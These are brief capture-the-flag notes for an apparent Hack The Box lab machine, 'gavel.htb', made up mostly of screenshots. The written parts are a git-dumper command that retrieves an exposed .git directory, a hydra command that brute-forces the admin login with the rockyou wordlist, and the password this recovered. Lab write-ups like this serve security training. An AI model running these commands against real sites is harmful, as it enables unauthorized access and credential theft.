![[IMG-20251213011002825.png]]

![[IMG-20251214003738176.png]]
```
git-dumper http://gavel.htb/.git/ ./dump
```

![[IMG-20251214003749687.png]]
![[IMG-20251214003922760.png]]

Admin username = auctioneer

```
hydra -l auctioneer -P /opt/lists/rockyou.txt gavel.htb http-post-form "/login.php:username=^USER^&password=^PASS^::S=302" 
```

![[IMG-20251214003657731.png]]

```
auctioneer:midnight1
```

